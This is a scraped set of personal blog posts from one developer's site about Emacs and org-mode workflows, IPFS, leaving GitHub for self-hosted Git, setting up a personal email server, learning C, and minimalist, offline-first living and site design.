the stress of using multiple programs to manage schedules and sync them. I don\'t just have my agendas and todos in one org file, they\'re spread out across all org docs on my machine, to where emacs can pick those up and add them to my org agenda letting me know when they\'re due and whatever other info I put in those todos. An example of this is working on some notes in org, adding a TODO tag with other info and setting a data to it, then when I view my org-agenda I can go in and see what\'s do and click on each todo which will take me to whatever file it\'s in.\nCalendar\nFor calendars I use a mix of the built-in emacs calendar and the MELPA plugin emacs-calfw which has the ability to sync any ics files as well as all of my org files to create an interactive calendar that I can access with Space + l + o. This has mostly eliminated the need for an online calendar but there\'s only been a few cases where I have gotten requests for a meeting and it just makes sense to sync with my NextCloud Calendar. If I can get WebDAV to sync my NextCloud and emacs calendar then this would of course be the ideal setup, but if that\'s not possible I might create a simple tool that utilizes WebDAV/CalDAV protocols to sync into a local file and run that on a cron job or something.\nPapers and Documents\nI\'ve now relegated all my writing to org and just import the LaTeX styling in my +org.el file so my documents stay easy to parse. Of course there are times where I want to write LaTeX for complex layouts such as my resume or my invoices and I leave that to using LaTeX and AucTeX with Emacs.\nAfterthoughts\nI hope that brings some insight into how I do some of my work and what my day-to-day sort of looks like for non-project related things. If you\'d like to see my Emacs configs I provide a link to my Doom Emacs configs for others to see here on my Gitea repository.\nPlease Note\nI wanted to state that don\'t have any affinity to any sort of software, so if there\'s something that people would deem problematic about some software or people behind said software I wouldn\'t really know about it as I just use whatever software helps me do what I need to do and respects my freedoms. I don\'t advocate said software or creators of said software.\nResources\n\naerc - Email client \nNewsboat\ncmus\nemacs-calfw\nRepository for Doom Emacs Configs\n\n'] at ['https://materialfuture.net/posts/blog/2020-06-tools-workflows/']

EXCEPT DESCRIPTION FOUND: ['Intro\nThis post is more of a means to share what I\'ve been working on, what I plan to work on, and what my goals are and if they\'ve changed since my 2020 Roadmap post. Since that initial post a lot has changed in the world just the past four months that it\'s worth sharing how that has also affected what I\'ve worked on and what my priorities are given the time to reflect.\nWhat I\'m Working On\nConsidering I work on a multitude of projects ranging from Crystal Lang related tools to text-based Guides for various topics.\nCycling Data\nThis is a project I created that allows me to quickly log my cycling progress in when I\'ve forgotten to use the AAT app on my phone. This came about because I couldn\'t seem to find a quick way to log my time on the stationary bike as well as real-world cycling data into a lightweight format, so I created one in an afternoon using Crystal a language I\'m familiar with. \nI mentioned that I wanted to import data from the AAT android application, this was important to me considering I use the app infrequently on trips, but I found it hard to find use for the data outside of the AAT application so I added in an import feature that allows me to quickly add the files contents to the database - a CSV file that logs all data for easy access - and strip all the data down to the bare minimum and normalize the units of measurement.\nIPFS\nI wrote earlier this week regarding IPFS and what I\'ve created with it but since that time I have looked more into the subject matter and have been assisting other via IRC on setting up their sites as well as sharing things I\'ve created like music in art with the swarm. I find IPFS so entertaining and very easy to use that I hope at some point I can get more people I know to start using it and maybe create more portable ways of using it ie. phones or a VPS.\nThe Ultimate Frugal Living Guide\nThis one is the most interesting of the bunch so far and is also one that I haven\'t discussed at all outside of IRC to which even then I haven\'t said much at all. This is a guide that explains and discussed the how and why of living frugal with resources and comprehensive lists and charts. I\'m hoping by the middle of next week to have the repo published with a wiki page and blog post setup for it that way others can read about it and contribute to it.\nThis came up as a result of a discussion on IRC about frugality as well as my current living situation and the situation in the world today with COVID-19, among other things. While it might not seem like a big endeavor, It\'s my first big project that involves org and not to mention my first big writing project so for me I\'m putting a lot of effort to make an impact with it and help as many people as I possibly can. As of writing this post I\'m in the staging of outlining everything as well as planning basic structure, licensing, and overall content of course.\nSelf-Hosted Solutions\nI\'ve been working towards creating my own ecosystem of micro-services hosted on servers that I manage to which I hope I can move to my own physical server if possible. \nSo far I manage; \n\nAn email server that hosts emails for the andrasmedia.org domain.\nA Git server where I can manage things like commits and do so in a minimalistic way. \nAn IRC instance so I can read and manage IRC communications from any device.\nNGINX server that handles a few sites.\nAn FTP like server that handles large amounts of files moving in/out for other sites.\nOther site related servers for clients.\n\nWhat\'s Next For Me?\nMy next projects include moving over more things to self-hosted instances and creating more tools to make my work easier and less of a hassle. Below I\'ll go into more detail about what I want to work on and what I plan to work on.\nGarden Management Application\nSo this is one that I\'ve been planning now for the better part of a year but haven\'t quite found what approach I\'d like to take with it. The idea is that it\'s a simple API or Library that helps people plan out their gardens with tips on harvesting data, when to plant things and so on. The basic application I want to be either a web-based application or a very well setup desktop application. Either way I want people to be able to get tips on how to make their garden efficient as possible.\nSince I\'m still mapping out what I\'d like to do with this I don\'t have much to say about it. If you\'d like to brainstorm with me the you\'re more than welcome to contact me regarding it.\nFrugal Living Guide\nI hope to have a working site for the frugal living guide and hope to make it as accessible as possibly to everyone. Aside from that the site would be for the most part a export of the org document that also hosts the PDF as well as links to contributers and such. Much more of this project needs to be thought about and discussed as well as be created so this will be something that I can see myself working on in the foreseeable future.\nGame Development\nI had gained some steam learning about and working on a short RPG for the GameBoy, but after creating the large sprite sheet template for others to use I sort of dropped off. I\'m hoping that next month or so I can just back into it and finish the game and start work on some games in the Godot engine.\nI\'ve been working on writing an organizing ideas for games in org documents and physical documents, but it\'s a matter of actually taking those ideas and making them into something playable.\nSelf-Hosting\nMy goal for this year is to move most everything I do onto servers I have control over and rely on services that are Freedom respecting as well as possibly have some integration into the Fediverse or have some sort of federation to them.\nCreating a nice ecosystem for myself for things like WebDAV and syncing of information via freedom respecting protocols is also the intended goal. \nLearning\nI\'m trying my best and keep up on my studies, that of which include;\n\nJapanese for the JLPT exam\nCrystal Lang\nRuby / Rails\nPHP / Laravel\nVueJS / Latest ES standards\n\nSome Extras worth Noting;\n\nReasonML + JS Ecosystem\nHack Lang + PHP Ecosystem\n\nMy goals from earlier this year learning C/C++ have changed as I\'ve found a great joy using Crystal Lang for mid-sized projects. That being said I still use C for somethings and have learn a lot more bash for the smaller tasks I like to automate or make easier.\nEt Cetera\nI realize now the length of this post is much longer than I would have liked so I\'m leaving this here as it\'s satisfactory for a post. Tomorrow or sometime soon I\'ll release an addition to this post with updates on what my goals are and a retrospective for the year so far. There\'s still a lot to cover and I would hate to go on for another however many sections and bore people any further. Below is a tl;dr of the contents of the post.\nTL;DR\nI\'m working on; \n\nNew tools with Crystal Lang\nLearning more about IPFS and utilizing it more\nCreating a comprehensive guide to living frugal in today\'s world\nLearning more things regarding Crystal Lang and working on Japanese again as well as JavaScript\nWorking towards a Self-Hosted ecosystem for myself\nI might start doing game development again\n\n'] at ['https://materialfuture.net/posts/blog/2020-06-current/']

EXCEPT DESCRIPTION FOUND: ['Intro\nRecently I\'ve been working on some software for myself that I\'ve just got around to releasing for tracking Cycling Data, this is able to track data as well as import from the Free Software AAT app.\nBesides working on personal tooling I\'ve recently discovered IPFS a peer-to-peer networking tool from some friends on IRC. From that I\'m learning about ways people can benefit from IPFS as well as some usecases for it other than just for fun, to which I\'ll go into more detail on later in the post.\nWhat is IPFS?\nIPFS is a distributed approach to the web, allowing networks of people to share resources and host full sites. \nInstalling And Setting Up IPFS\nFollow the instructions on the website to install either desktop or command-line versions.\nAccessing Sites\nAccessing a site is simple;\n\nIf you\'re using the command-line version, start the daemon and then visit the link provided.\nIf you\'re using the desktop version, then just click whatever links you have and you should see it\n\nThe Command-Line Version\nThe Command-Line implementation is easy to understand if you already understand the UNIX filesystem;\n\nTo look into a directory: $ ipfs ls <hash>\nTo see the contents of a file: $ ipfs cat <hash>\nTo Download the file: $ ipfs get <hash>\nTo add a file to the swarm: $ ipfs add <file/path/locally>\nTo add a directory and it\'s contents: $ ipfs add -r <hash>\n\nYou should start to see the pattern here.\nWhy Use IPFS?\nThe question of why comes up any time there\'s new software to be used and adopted, so I\'ll list a few cases in which someone could benefit using IPFS.\nSharing Large Files\nLet\'s say you\'re a game developer or working on some software that requires large assets to swapped fast for review, well something like IPFS would allow you as the developer or 3d sculptor to just upload the files to the swarm and give the hash over to whomever needs it. This is of course assuming everyone has it because when more people use it at the company the faster the network gets.\nSecurity\nOne of the biggest problems that comes to mind is security, and with things like file sharing that becomes a big concern which IPFS can help with. As long as you create your own swarm, the network is just within people that know about the swarm which means the assets aren\'t to be reached outside of the network. That example of the game company relates to this as well but also Legal Departments where sharing of files is important to your work and leaks or compromised data can lead to time lost and lawsuits.\nCheaper Alternative\nIf you\'re cheap, like me, then you probably would want to save money on sending and storing files. IPFS can act as a sort of local CDN that delivers files to people internally fast. If you work on website at a company, you wouldn\'t have to setup a whole server to test things on, the site and it\'s assets could be handled within the network with no servers.\nWho Uses P2P (Peer-To-Peer) Networks?\nFacebook for the longest time used BitTorrent and general P2P for their software deployments as well as for internal projects. Microsoft\'s Skype used P2P for video calling which allowed for faster connections than the hosted alternative and very little bandwidth for them to manage. A lot of these larger companies utilized P2P realizing it\'s capabilities so I wouldn\'t be surprised to it the second-wave of P2P networking in the public sphere.\nWhat Now?\nI think IPFS is worth trying out or at least assessing if your company could benefit from using it.\nI\'ve gone ahead and setup a site as well as files within a private swarm with some people I know. It\'s easy, fun, and overall a good insight into a technology that could really change networking.\nResources\n\nMedium Article Regarding IPFS\n\n'] at ['https://materialfuture.net/posts/blog/2020-06-ipfs/']

EXCEPT DESCRIPTION FOUND: ['Intro/Preface\nI\'d like to start this off by saying this is not a review of this book but rather a retrospective into the time spent with the book and what I\'ve learned/done in regards to C since reading it. This book is from 1994 so this predates c99 which is considered a more superior version, but my goal was to learn the fundamentals of C and understand what it\'s for and what it can do. This book contains some outdated knowledge regarding IDEs and compiling which I disregarded considering I use Emacs and compile with gcc.\nRegarding The Book\nI found that this book does an excellent job of describing what C can be used for as well as detailed discussions regarding how to do something. The Why and How of learning a language is important, for example it gives context to why you\'d want to use a switch case in comparison to something like the typical if/elseif as well as how they differ.\nThe pacing of the book is adequate as it takes the time to explain concepts using examples or use-cases with the occasional picture to support the new concepts, however it can be a bit irritating having to discern what I need to be looking for in a three-page spanning text document with very few comments made within. The exercises I found to be a bit difficult having not learned the concepts within chapter fully but was able to get through about half of the ones on the initial pass. Revisited some of the challenges later on and was able to grasp what they wanted me to do, but again only later on, if that was the intention then I don\'t knock it for this.\nHave I Used C Since?\nTo be honest, not much. I used this book to better learn how the UNIX operating system interacts with C, and while this isn\'t the book to do so with, C is what the Linux kernal was written in so learning the language better explains the how and why in some regards. That being said, I have used the knowledge from C to further my knowledge regarding Crystal Lang and have worked on integrating C Libraries into some projects to have better access to the Linux kernal.\nThe macros and functions in C are familiar to me coming from similar languages, so this book felt like taking a deeper dive into topics I was only fairly familiar with.\nWould I Recommend This Book?\nProbably not, and the reason for that isn\'t because it\'s bad it had to do more so with how outdated the materials are. You\'d be better off trying to find a more up to date version of this that at least covers C99 since that will give you a more modern and flexible approach to working with C. pre-C99 is harder to work with and will require some reinventing of the wheel that C99 has already solved. I happened to get this book at a second-hand shop for $2, so if you can, find a more up to date version of this.\nIf you have any interest in programming or computer science in general I would recommend picking up a book on C, Lisp, or Haskell as they will explain how programming works on nearly every level.\n'] at ['https://materialfuture.net/posts/books/practical-c-programming/']

EXCEPT DESCRIPTION FOUND: ['Intro\nRecently there has been a exodus of sorts from the platform in regards to GitHub and what Microsoft is trying to do in terms of acquiring open source projects and using them, more info regarding that here. \nIn response to that I\'ve decided to move away from GitHub for my projects, but instead focusing on self-hosted alternatives. At the moment I have GitLab as my main Git Forge service but I\'m working towards getting Kallithea setup as it has everything I need for code collaboration that GitLab offers while being GPLv3 Licensed. Other options are some Gitea services such as CodeBurg or vanilla GitTea, more services are outlines on my Hosting Services Wiki Page.\nWhat I\'ve Done\nMy first step in becoming self-hosted was setting up a Klaus instance as it\'s dead simple to setup and runs on very minimal hardware. That being said it does all I need it to and allows me to manage repos via the command line and ssh.\nSo far I\'m enjoying Klaus and really enjoy hosting my own services, I hope by at least near the end of 2020 that all my software projects are moved to and hosted either by my own services or by FreeDom respecting ones.\nThe Idea\nThe idea is that I want to be more in control of my data and what is happening with my projects. I want to create software without the worry of companies taking advantage of free-software without adhering the licenses. Software is political and as a developer it should be your right to stand up for your/others works. \nResources\nThe topic of GitHub moving forward with more malicious intent towards Free Software seems to be getting buried in the search results, so here\'s a couple of links that are relevant in regards to this topic. I implore you to do your own research of course, don\'t always take one person\'s word as fact.\n\nHelping People Quit Microsoft GitHub\nAll my source code repositories are now on Codeberg\nTechRights GNUHub\nHosting Services Wiki Page\n\n'] at ['https://materialfuture.net/posts/blog/2020-05-git-revamp/']

EXCEPT DESCRIPTION FOUND: ['Intro\nA problem I\'ve faced lately was finding proper documentation for setting up a simple one domain email server. \nIn the past I\'ve setup FTP, SFTP, SSH, and Web Servers, but I\'ve never had the chance to properly setup an email server so why not try it out during this time of quarantine.\nPlease note, this post is not just for people that just need a personal email server it\'s also for idividuals or businesses that want to maintain their own properties with their own domain and user accounts. See Resources at the bottom of the post for more info as to why you\'d want this\nUpdates\n\nMarch 6th 2021: If you\'re having trouble with LetsEncrypt Certificates please remember to install/run certbot for those.\n\nThe Reason\nMy reasoning for doing this is to have an email that can be used on whatever client, has offline capability, and I\'m in control what happens with it. I got tired of ProtonMail and other providers costing so much just to add on a domain, when in reality all that does is point that email to your ProtonMail one.

This is important to note because everywhere I\'ve seen it costs around $5 just to add a domain to another person\'s server, which makes no sense to me because you could easily implement your own for less.\nBelow I\'m going to list the comparison of different providers to show you what they provide. I will only list the base monthly costs with notes at the bottom explaining some of the caveats.

If you mess up the server at any point you can reinstall from a backup or reinstall the OS altogether.\nSome Prerequisites\nFirst Things:\n\nHave a domain already purchased and make sure you\'re able to ping it\nName your instance something like box.yourdomain.tld\nLink all your SSH keys\nOnce the server is setup lets ssh into it:\n\nssh root@<your server IP here>\nOnce we\'re in let\'s run another update to make sure we have the latest of everything.\nsudo apt upgrade\nIf you want to have automatic updates read this article over the matter.\nNow that you\'ve done so let\'s get to the meat of what we\'re doing, setting up postfix, dovecot, and spamassassin. Thankfully Luke Smith has provided an easy-to-use script for doing so we don\'t have to reinvent the wheel (or read 100 different pages regarding postfix/dovecot documentation), to which I recomend everyone using for this guide. EmailWiz is simple, just curl -LO lukesmith.xyz/emailwiz.sh and you\'re good to go with this. However, please read over all the documentation in the script as to what it\'s doing, some email server will require some different settings that you\'ll have to tweak in the script.\nWhat this does is it sets up all that you\'ll need for the email server. Once you\'ve run the script make sure to copy over the two codes it will give you to use in your DNS panel for the domain you have.\n\n  \n    Setup the DNS\n  \n  \n    Name\n    Record\n    Value\n  \n  \n    box.yourdomain.tld\n    A\n    Your Static IP\n  \n  \n    yourdomain.tld\n    MX\n    box.yourdomain.tld\n  \n  \n    mail.yourdomain.tld\n    A\n    Your Static IP\n  \n  \n    domain.tld\n    TXT\n    SPF1 Code That EmailWiz Gives You\n  \n  \n    mail._domainkey.yourdomain.tld\n    A\n    DKIM Code That EmailWiz Gives You\n  \n\n*Notice that this is where you\'ll link the mail.yourdomain.tld at, this is so you can use thunderbird and other software to login\nMake sure by this point that you\'ve setup all the above before moving forward.\nNow your domain isn\'t going to magically work right off the bat, I\'d recomend giving your server and domain registrar 24 hours to properly propigate the changes so that way it\'ll work correctly on all platforms. \nOnce you\'ve waited, it\'s time to setup your users. So assuming that you\'ve already setup a basic admin user or whatever account will act as a sustitute for root now you\'ll want to setup other users, do so by creating them the linux way:\nsudo useradd USERNAME This should prompt you with a password and all info for the user\nMove that new user over to the mail group, dovecot I believe created this during install:\nsudo usermod -aG mail USERNAME\nNow you user should be created and with access to emails. You can test this out by going into ThunderBird to log into your email with the credentials created.\nOn the initial setup this should create the INBOX, TRASH, etc. to use with emails.\nThat\'s about it for setting up emails. Not that difficult, just a lot of prep work and research involved before chosing a provider and such that works with what you need.\nLet\'s Emcrypt Certs\nEnsure you have a lets encrypt certificate for the domain you\'re using, use certbot for the domain as that is fairly simple to use.\nOptional\nAliases\nI\'ve seen a few guides online for setting up aliases, but here\'s an easy and quick way to do so.\nGo onto your server as a superuser with sudo access and open up the aliases file:\n\'sudo vim /etc/aliases\'\nNow you can route where emails go to, and even have a catch all one for use with things like admin or webmaster to go to root@yourdomain.tld\nHere\'s what an alias file can look like.\n\nmailer-daemon: root\nadmin: root\nwebmaster: root\nnobody: root\n...\n\nMake sure once you\'re done editing to refresh the aliases\nnewaliases\nRunning this command refreshes the database that postfix uses for aliases. Linux also will adhere to these aliases, so keep that in mind.\nNote that aliases are useful when you have a name that might commonly be misspelled, so you can have aliases that catch that email and send it to the right one, that\'s something you can\'t do with a free serverice. Make as many aliases as you need, they\'re useful and easy to setup.\nExtras\nIf there\'s anything incorrect or something you\'d like to add just shoot me an email at materialfuture at andrasmedia DOT org\nIf you believe I\'ve misrepresented something on here or there\'s anything that doesn\'t make sense please let me know and I\'ll be quick to change it.\nSomething not working for your system? Let me know and I can update the docs or can make a fork of Emailwiz for that since that would be useful.\nResources\nBelow are more resources where you can learn about emails.\n\nSecuring Your Server\nInfo as to why you\'d want to host your own emails\nList of freedom respecting email providers\nFSF Recomended Email Services\nFSF Guide to Email Self Defense\nSetting up Email Aliases\nLuke Smith\'s Emailwiz\nPostfix Site\nLinode setup for Postfix and Dovecot\n\n'] at ['https://materialfuture.net/posts/blog/2020-04-email-server/']

EXCEPT DESCRIPTION FOUND: ['As of the new year I\'ve made a concious effort to work out all the proprietary\nsoftware form my workflow, the biggest one being VSCodium. To start off I moved\nmy daily driver from beeing my MacBook 2018 model to a ThinkPad x200 configured\nwith Arch + i3-gaps and a suite of custom written bash scripts to automate my\ndevelopment, so from that I had to think of alternatives to what I used on my\nMacBook and make sure to check licenses as well as see how well they ran on\nolder hardware. My file manager is now nnn or ranger depending on what I\nfeel like, my Image viewer is suckless sxiv, PDF viewer zathura, and many\nother alternatives that basically are CLI-based applications that work well with\nor along-side suckless dmenu. The hardest thing for me was choosing an editor\nfor working on larger projects (such as this site for example) as Vim or NeoVim\nis perfect for bash scripting or smaller projects I needed something that would\nbe an all-in-one tool. \nOn MacOS I went from Sublime Text -> Atom -> VSCode -> VSCodium, and while\nVSCodium is still the best alternative for GUI work, there\'s still some things\nthat are proprietary, and some features can still ping back home to Microsoft\nwithout your concent. So as I searched online and in books I found the one\nanswer was GNU Emacs as an IDE. I had tried in the past to learn emacs but I\nfound that it was all a bit much for me, and I just wanted something that\nworked.\nAround late January I left the company I had moved across state for and had\nreally nothing lined up, so as I had time to kill looking for work I decided to\nbuy as many programming and tech-related books as I could that I thought were\nrelevant to what I wanted to learn. So I picked up a book on Mastering Emacs and\na book on the GNU Linux cookbook with all the default keybinding for emacs\ninside. From a previous attempt at learning I had downloaded Doom Emacs, which\nis GNU Emacs with some vim bindings (evil-mode) and with an Melpa (emacs\npackages) helper already setup. This madde learning even simpler as I didn\'t\nhave to really worry about setting up this monolith of a program (operating\nsystem really).\nWhat\'s Emacs got that others don\'t? Emacs allows you complete freedom in what\nyou wish to do with it, and it\'s self documenting, meaning when you change\nsomething the documentation can reflect that change. Org-Mode is what seems to\nattract most people, and it alone is a fully featured notes, todo, and\nscheduling tool that can syncronize with projects. Magit, Emacs\' git manager is\nas easy as M-x magit-status to pull up magit, s to stage file for commit -> \nc+c to commit  -> p+u to push tp origin, all in a REPL that drops down so you\nnever have to touch your mouse or leave that screen you wereon. Everything is can\nbe modified, anything can work the way you want.\nSo why go through the trouble of learning Emacs and having to configure things,\nwhy linux, etc. These questions I\'ve gotten before, and to answer simply is that\nI like my stuff a certain way, so I should be able to configure to my liking. As\na programmer or tickerer you should take pride in your machine and your\necosystem of an operating system. Right now I have everything a keybinding away\nin either Emacs or on Arch so I can launch whatever I need quickly. I take pride\nin all I\'ve done to configure my system so it feels second-nature to me, and\nwhile others just want something that works, that\'s completly fine. Programming\nand configuring system-related stuff is a form of Zen for me, so it brings me\npleasure knowing I can load a youtube video in whatever format, have it float\nwhereever on my screen and do this all with a couple keystrokes and cooperate with dmenu.\nThe main reason though that I go through the "pain" of going through Free/Libre or\nalternatively open-source software is that I care about my freedoms as a user, I\ndon\'t want to be the product I just want to make things without having to worry\nabout licenses or insecure practices (looking at you microsoft/google products).\nThe fact that I can write my LaTeX papers and compile/preview them without\nhaving to move to another window or screen is really nice, same goes for\ncompiling C/Lisp code, I just use the REPL and follow the keybindings to execute\nthe needed comand.\nIf you\'re wondering why I chose Doom emacs then it\'s because I could handle my \nconfigs between multiple machines easier, also the faster loading times and\npreconfigured MELP support helps. \nOverall, I\'ve found Zen in Emacs, a kind of Zen that comes with having the\nfreedom to do whatever with my text editor and subsequently the things I edit. I\nhave the freedom to do as I please with my software, create whatever I like\nwithout being inhibited by a malicious feature. You get the idea, there is the right\ntool for the job, sometimes it\'s Vim and sometimes it\'s Emacs but at least it isn\'t Nano.\nI implore others to do your own research on emacs and see if it\'s right for you,\nwhich understandably may not be so. I have resources regarding Emacs in my\npersonal Wiki so take a glance at those if you\'re interested.\nBelow are some links regarding emacs on my wiki:\n\nPersonal Doom Emacs Configs\nEmacs Resources\n\nHere\'s some related post regarding the subject of minimalism and such:\n\nCurrent Goals in 2020\n2020 Roadmap and Retrospective\nRedesigning My Site + Minimalism On The Web \n\n'] at ['https://materialfuture.net/posts/blog/2020-03-emacs/']

EXCEPT DESCRIPTION FOUND: ['Intro\nSince the time of writing my last post I have had the chance to review all of\nmy past work and reflect on what I\'ve done right and what I\'ve done wrong, or\nrather what I could do better in the future. From the projects published on Git\nservices to what\'s on this site, I see the path taken and want to rectify\nwhatever mistakes made along the way by learning correct and effective methods\nof programming and the sort.\nFocus\nMy Focus Then\nMy focus last year was learning Crystal for the sake of learning programming to which now\nI only slightly regret as I feel cheated by my own desire to learn something\nsomewhat easy not something hard.\nI was in fact challenged by having to learn how to read API documentation on a language. Reading said API and\ntrying to make snese of something with little documentation proved to be a good\nsince I am able to understand the Crystal Source code and subsequently other\nrepositories of source code for other projects. \nThere were good and bad habits I\npicked up from Crystal, good being that I learned the How To and Why of Testing\nsoftware and it\'s importance overall, bad though because I utilized Crystal type\nhandling and never worried about type or the handling of memory.\nMy Focus Now\nMy focus now has shifted not by much but enough to move me away from Crystal for\na bit. Seeing how others have made really effecient software using low-level\nlanguages such as C and assembly inspired me to want to learn how C can be used to\ncreate such amazing programs. I\'ve seen that most Linux utilities utilize C and\nare able to be system agnositc due to the low-level nature of C. Tools such\nas curl are so simple yet so complex and that truely intregues me.\nI recently purchased some books on C such as Practical C Programming, Modern C,\nand Understanding C Pointers. From these I started working through Practical C\nand went on to setup a\nrepository of what I\'ve learned.\nThe reason for me moving to C is less about what I want to do and more about\nwhat I don\'t want to do. I don\'t want to pickup a language for it to not be\nuseful in a job scenario, or for when I want to collaberate with others, this is\nwhat I felt held me back a lot with Crystal Lang was the lack of others using\nit. Javascript gave me the ability to land jobs and feel as though I was\ncontributing, so I want my experience with C to hopefully be the same.\nWorking through the books offline now I\'m able to focus like before but without\nthe frustration or the brick walls of a language in it\'s immaturity. My journey\nmost likely wont end with C but I can see myself sticking with it.\nI strive to always do better and improve.\nRelax\nRelaxing has been a struggle as of late, with all the talk of COVID-19 and the\nlack of clients I have had to keep busy trying to improve as well as work with\nvery little winding down throughout the day. I\'ve always had a tough time with\nwork/life balance and trying to get that ratio just right, but right now I have\nthe oppourtunity to reinvent myself and my schedule.\nSome good things that have come out of this down time is that I\'ve been\nimmersing myself in books, both for learning and for pleasure and it has been\namazing. I have always been a fan of reading but I\'ve begun to appreciate it\nmore so having read more.\nI have limited myself playing games and consuming media as much as possible\nsince I\'m a strong believer in those as being more of experiences rather than\ntime-wasters so I wish to saver whatever I put my time into.\nTLDR\nI\'ll cut this off here since I feel this post is going to be longer than I\ninitially wanted. The gist is, I\'m moving away from Crystal to learn C and also\nperhaps jump back into JS when I get a chance soon. I also read a lot more and\nthat\'s been really great for my mental health, maybe everyone should put down\ntheir phones and read more.\nMaybe I should get a dumb phone and live a bit simpler. Go invest in a boat and\ngo live my life outa on the seas.\n'] at ['https://materialfuture.net/posts/blog/2020-03-current-goals/']

EXCEPT DESCRIPTION FOUND: ['Intro\nLet me preface this post by saying that 2019 was a trying year for me and my family. This past year has revealed a lot of what I\'d like to do moving forward in work and in regards to how I live.\nIn 2019; I got married, got settled into a house, moved jobs, moved cities, learned new programming languages, and learning more about myself in the whole process. \nLiving minimal\nHaving to travel for work has caused me to re-evaluate what all I consider necessary and started living more minimal because of it. I started working primarily from a Libre-Booted Thinkpad x200 and from that learned the hardship of programming offline, but more importantly learned the importance of leaner software and offline capable applications. \nHaving previously been a MacOS "power-user" and taking for granted the fast processor and fast internet of my house at the time, I had realized that I\'ve been designing and programming for the small percentage of the world with unlimited internet and expensive computers rather than the large portion of the world that doesn\'t have access to those things. The moral responsibility of creating is to create responsibly and to have purpose in what is created as our creations are an extension of ourselves.\nProgramming Minimal\nAt the time of writing this I\'ve enrolled in a CS course focusing on C++/C development to; better understand OOP and it\'s purpose, better understand the computer and what it does, and learn how ot make applications that utilize resources more responsibly. The reason for taking the course isn\'t really for a career change, it\'s more that I gain a perspective on things understand how to better utilize computers to do tasks more efficiently. I currently work on Crystal Lang projects where I create safe/reliable applications for use with the terminal and elsewhere, but to better understand how that all works I feel I need to ground myself in general computer science and learn more. Creating tools and apps that mean something to people can be hard, but I really need to put the time and effort into working on more FLOSS projects and contributing to software whenever I can. \nDesigning Minimal\nMoving forward I hope to update any designs I work on to be leaner and with greater purpose. Designs I had previously worked on were too reliant on the preconceived notion that they need to look like something, but if my time at the IDF taught me anything it\'s that we should understand what the users really want and what they need.\nThe User Experience outweighs the design because if something isn\'t enjoyable to use then why would anyone care if it looks good? Moving forward I will design with that purpose in mind and make an effort to use empathy and understanding in my designs, and with that hope to create something that looks good, feels good, and is something useful. Aside from just creating I\'ll be focusing more of my time to research better design patterns and more relatable interaction design for a variety of platforms and mediums.\nCurrent Efforts\nCurrently my environment is setup to work offline and reliably. I moved all my writing to Git and converted all that I work on into LaTeX, GROFF, or Markdown to store easier in version control. I moved my website to an offline capable environment that doesn\'t require any 3rd party scripts and can be developed entirely offline. My designs have mostly been transferred to Affinity format and stored in Git-LFS, but I will be finding some better method of storing them. All my books I carry on a flash drive\xad as PDFs or as an ePub and are backed up on my NAS at home. Overall I think I\'ve made a good effort to move all that I do to offline focused alternatives and be more conscious of my data consumption.\nUsing less internet of not only good for mental health but also uses less carbon. My phone is an old Samsung S5 with LineageOS with G-Apps disabled and runs only FLOSS apps, by making the switch to this phone it allowed me to reuse an older phone instead of buying a new one and use less electricity and internet by being in control of what my device runs. The same goes for my Thinkpad x200 as it runs Arch with only CLI applications, no GUI other than PDF readers and surf, this means it uses less electricity and can work offline. I do have a MacBook and desktop computer when I\'m working on larger projects but I try and minimize the amount I use those as time goes on, as Prof. Oak once said "there\'s a time and place for everything".\nOverall this past year alone I\'ve tried to reduce my carbon footprint as much as possible since I\'ve had to travel a lot by car. In the past year of gone vegetarian (working on going vegan), making most of my meals at home, reducing food waste by composting, sorting though family members\' and my own recycling to take to the appropriate places, reduced my time on the computer by reading books more (only second-hand), moved completely away from traditional social media for things like Mastodon, IRC, and RSS feeds, download all my podcasts and music for offline use, and more importantly switched my house and now my current residence over to sustainable sourced LED light bulbs. I\'ve made a lot of strides in the past year and I want to keep the momentum going and start to inspire people to live the same way and get people away from the toxic consumer-focused mindset most people have today.\nGoals for 2020\nBelow are the goals I hope to reach or at very least be on the way of completing come the end of the year.\nAs A Developer\nI want to move all my applications to be accessible offline, work as a single binary, not rely on many or any 3rd party libraries, and be as lean as possible. Any web facing application should be WCAG/ADA Compliant to make sure that application can be accessed by people with disabilities. Look into more green hosting providers and leverage providers that are green focused.\nAs A Designer\nDesign for everyone in mind, including people with disabilities so the project not only reaches more people but can connect people together.\nAs a person And Overall\nStart moving towards using and supporting applications that help others such as Ecosia Search who donate ad revenue to replanting trees and move even more of my work and personal things to offline locations. \nReduce the amount I buy and consume, recycle and up-cycle products whenever I possibly can, and buy products second-hand to reduce tech waste and give old objects a new home/purpose.\nFocus on projects that connect people together and create things with a purpose. Trade my car in for something more affordable that relies on more sustainable energy and uses less fuel. Look into growing my own food when I find a place to settle down. Maybe sometime this year I can start working on that game I\'ve been thinking of if time permits, who knows.\nThe future starts with you, so be the change you want to see in the world.\n'] at ['https://materialfuture.net/posts/blog/2020-roadmap-and-restrospective/']

EXCEPT DESCRIPTION FOUND: ['Intro\nI created this site, and subsequently the Minimal Theme, as a means to create a better repository for my thoughts and create something that can be used on any device as well as any browser (including Lynx). While it\'s not flashy, it\'s functional and serves it purpose without using any javascript, third-party libraries, or very much CSS (~5Kb). \nThe reason I chose Zola was to move away from dependencies and focus just on developing the site. If I install my site on a server it\'s as easy as installing the Zola Binary, cloning my repo, and building. This makes hosting on any linux server possible as long as you can install web hosting tools and the binary, you\'re good to go. \nThe Inspiration\nI have been working with websites professionally for about 5+ years, User Experience for around 2+, but only recently had found out about the rise in popularity with Tech Minimalism and the Solar-Punk movement. I became inspired after seeing @neauoire write about their experience creating software and websites using minimal code for the sake of offline use and for the conservation of electricity and data. \nHaving now read about and immersed myself in more minimalist practices in my daily life I wanted to recreate my personal blog into something more minimal, something more useful, something more me.\nThe Future\nAt the start of this project I only wanted to create a blog and a repository for links, but I\'ve now been inspired to expand on that and start a wiki where I\'ll organize my thought so others and myself can reference them. I don\'t just want this to be some basic portfolio site, I want this to be an extension of my thoughts and actions while sharing knowledge along the way. Hopefully when people find this site that they can be able to walk away having learned at least something.\nAs someone who develops on the web it\'s my responsibility to make sure that the future of it is accessible to everyone and not bloated by packages and unnecessary functions. I encourage others to take on this approach as well and be responsible for what you put out there on the internet.\nResources\nI\'ve included some reading material for those interested in learning more about bloat on the web as well as some information in regards to carbon emission waste on the web\n\nWebsite Carbon Emmisions\n@neauoire on Longtermism\nThe Green Web Foundation\nViznut on Futurism\n\nNote: I\'ve enabled RSS feeds for whatever category and tag so people can follow, so you can follow whatever sounds interesting, just append /rss.xml to the page category or tag and it\'ll have a feed for it. I want people to be able to follow the blog in offline scenarios as well, and don\'t worry I 